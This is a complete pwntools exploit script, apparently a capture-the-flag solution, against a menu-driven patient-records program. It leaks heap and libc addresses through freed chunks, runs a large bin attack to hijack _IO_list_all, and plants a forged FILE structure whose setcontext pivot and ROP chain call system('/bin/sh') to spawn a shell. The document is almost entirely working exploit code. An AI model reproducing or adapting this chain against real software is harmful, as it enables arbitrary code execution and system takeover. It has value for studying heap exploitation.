from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "localhost"
remote_port = 61044
gdbscript = '''
'''

def conn():
    r = remote(remote_url, remote_port)
    return r

def demangle(val, is_heap_base=False):
    if not is_heap_base:
        mask = 0xfff << 52
        while mask:
            v = val & mask
            val ^= (v >> 12)
            mask >>= 12
        return val
    return val << 12

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

r = conn()
menu_delim = b'> '
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

def register_single(first, age, bio, make_appt=False, use_ins=False, ins_name=None, appt_desc=None):
    menu(1)
    sla(b'Choice: ', b'1')
    sla(b'Make appointment? (y/n): ', b'y' if make_appt else b'n')
    sa(b'First name: ', first)
    sla(b'Age: ', sn(age))
    sa(b'Bio: ', bio)
    if make_appt:
        sla(b'Use insurance? (y/n): ', b'y' if use_ins else b'n')
        if use_ins:
            sa(b'Insurance name (8 chars): ', ins_name)
        sa(b'Description of pain: ', appt_desc)
    return int(r.recvline().split(b': ')[1])

def register_double(first, last, age, bio, make_appt=False, use_ins=False, ins_name=None, appt_desc=None):
    menu(1)
    sla(b'Choice: ', b'2')
    sla(b'Make appointment? (y/n): ', b'y' if make_appt else b'n')
    sa(b'First name: ', first)
    sa(b'Last name: ', last)
    sla(b'Age: ', sn(age))
    sa(b'Bio: ', bio)
    if make_appt:
        sla(b'Use insurance? (y/n): ', b'y' if use_ins else b'n')
        if use_ins:
            sa(b'Insurance name (8 chars): ', ins_name)
        sa(b'Description of pain: ', appt_desc)
    return int(r.recvline().split(b': ')[1])

def register_triple(first, middle, last, age, bio, make_appt=False, use_ins=False, ins_name=None, appt_desc=None):
    menu(1)
    sla(b'Choice: ', b'3')
    sla(b'Make appointment? (y/n): ', b'y' if make_appt else b'n')
    sa(b'First name: ', first)
    sa(b'Middle name: ', middle)
    sa(b'Last name: ', last)
    sla(b'Age: ', sn(age))
    sa(b'Bio: ', bio)
    if make_appt:
        sla(b'Use insurance? (y/n): ', b'y' if use_ins else b'n')
        if use_ins:
            sa(b'Insurance name (8 chars): ', ins_name)
        sa(b'Description of pain: ', appt_desc)
    return int(r.recvline().split(b': ')[1])

def change_insurance(id, new_ins_name):
    menu(2)
    sla(b'Patient ID: ', sn(id))
    sa(b'New insurance name (8 chars): ', new_ins_name)

def view_patient(id, get_output=False):
    menu(3)
    sla(b'Patient ID: ', sn(id))
    if get_output:
        r.recvuntil(b'description: ')
        return r.recv(6)

def delete_patient(id):
    menu(4)
    sla(b'Patient ID: ', sn(id))

def cancel_appointment(id):
    menu(5)
    sla(b'Patient ID: ', sn(id))

def demangle(val, is_heap_base=False):
    if not is_heap_base:
        mask = 0xfff << 52
        while mask:
            v = val & mask
            val ^= (v >> 12)
            mask >>= 12
        return val
    return val << 12

'''
GET HEAP LEAK
'''
dummy_id = register_single(
    first=b'John', 
    age=25,
    bio=b'Healthy patient',
    make_appt=True,
    use_ins=True,
    ins_name=b'BCBSAZ12',
    appt_desc=b'Back pain'
)
dummy_id_2 = register_single(
    first=b'John', 
    age=25,
    bio=b'Healthy patient',
    make_appt=True,
    use_ins=True,
    ins_name=b'BCBSAZ12',
    appt_desc=b'Back pain'
)
cancel_appointment(dummy_id)
cancel_appointment(dummy_id_2)
dummy_id = register_single(
    first=b'John', 
    age=25,
    bio=b'Healthy patient',
    make_appt=True,
    use_ins=True,
    ins_name=b'BCBSAZ12',
    appt_desc=b'Back pain'
)
dummy_id_2 = register_single(
    first=b'John', 
    age=25,
    bio=b'Healthy patient',
    make_appt=True,
    use_ins=True,
    ins_name=b'BCBSAZ12',
    appt_desc=b'Back pain'
)
cancel_appointment(dummy_id)
delete_patient(dummy_id_2)
id_heap_leak = register_single(
    first=b'John', 
    age=25,
    bio=b'Healthy patient'
)
leaked_heap = demangle(u64(view_patient(id_heap_leak, True).ljust(8, b'\x00')))
logleak('leaked_heap', leaked_heap)
pause()

'''
GET LIBC LEAK
'''
ids = []
for _ in range(8):
    ids.append(register_single(
        first=b'John', 
        age=25,
        bio=b'Healthy patient',
        make_appt=True,
        use_ins=True,
        ins_name=b'BCBSAZ12',
        appt_desc=b'Back pain'
    ))
for i in range(7):
    cancel_appointment(ids[i])
ids.append(register_single(
    first=b'John', 
    age=25,
    bio=b'Healthy patient',
    make_appt=True,
    use_ins=True,
    ins_name=b'BCBSAZ12',
    appt_desc=b'Back pain'
))
cancel_appointment(ids[7])
delete_patient(ids[8])
id_leak = register_single(
    first=b'John', 
    age=25,
    bio=b'Healthy patient'
)
leaked_libc = u64(view_patient(id_leak, True).ljust(8, b'\x00'))
libc.address = leaked_libc - 0x21ad70
_IO_list_all = libc.sym._IO_list_all
logleak('leaked_libc', leaked_libc)
logleak('_IO_list_all', _IO_list_all)
logleak('libc_base', libc.address)
pause()

'''
LARGE BIN ATTACK
'''

# Prepare chunk so that we can use change_insurance on id0 to overwrite bk next size
id0 = register_single(
    first=b'John', 
    age=25,
    bio=b'Healthy patient',
    make_appt=True,
    use_ins=True,
    ins_name=b'BCBSAZ12',
    appt_desc=b'Back pain'
)
delete_patient(id0)
id0 = register_single(
    first=b'BBBBBBBB', 
    age=25,
    bio=b'Healthy patient'
)

# Start large bin attack
id1 = register_double(
    first=b'Jane',
    last=b'Smith',
    age=35, 
    bio=b'Has chronic pain',
    make_appt=True,
    use_ins=True,
    ins_name=b'BCBSAZ12',
    appt_desc=b'Back pain'
)

# PREVENT CONSOLIDATION
register_single(
    first=b'John', 
    age=25,
    bio=b'Healthy patient'
)

# Craft chunk that will be used for fake file
binsh_ptr = next(libc.search(b'/bin/sh\x00'))
_IO_wfile_jumps = libc.sym._IO_wfile_jumps
setcontext = libc.sym.setcontext + 61
pop_rsi = libc.address + 0x001bb197
pop_rdx_rbx = libc.address + 0x001753b8
pop_rdi = libc.address + 0x001bbea1
ret = pop_rdi + 1
chunk_addr = leaked_heap+0x4000 # Address of our chunk that will be used as fake file (calculated from gdb)
fake_file = flat({
    0: {
        0x88: chunk_addr,          # lock
        0xa0: chunk_addr + 0x100,  # _wide_data (rdx)
        0xd8: _IO_wfile_jumps,
    },

    # _wide_data
    0x100: { 
        0x18: 0, # _IO_write_base
        0x30: 0, # _IO_buf_base
        0xa0: [chunk_addr+0x300, ret], # setcontext will pivot stack to chunk_addr+0x300
        0xe0: chunk_addr + 0x200, # _wide_vtable
    },

    # wide vtable
    0x200: {
        0x68: setcontext, # RIP control
    },

    # spawn shell
    0x300:{
        0x0: [pop_rdi, binsh_ptr, libc.sym.system]
    }
}, filler='\0')
id2 = register_single(
    first=b'John', 
    age=25,
    bio=fake_file[0x30:0x3f0],
    make_appt=True,
    use_ins=True,
    ins_name=b'BCBSAZ12',
    appt_desc=b'Back pain'
)

# Trigger large bin allocation
delete_patient(id1)
id3 = register_triple(
    first=b'Robert',
    middle=b'James',
    last=b'Johnson',
    age=45,
    bio=b'Regular checkup',
    make_appt=True,
    use_ins=False,
    appt_desc=b'Annual physical'
)

delete_patient(id2)
change_insurance(id0, p64(_IO_list_all-0x20)) # Overwrite bk next size

# This will overwrite _IO_list_all to the chunk of id2
id4 = register_triple(
    first=b'Robert',
    middle=b'James',
    last=b'Johnson',
    age=45,
    bio=b'Regular checkup',
    make_appt=True,
    use_ins=False,
    appt_desc=b'Annual physical'
)

print('_IO_list_all hijacked...')
pause()

# Exit to spawn shell :)

r.interactive()
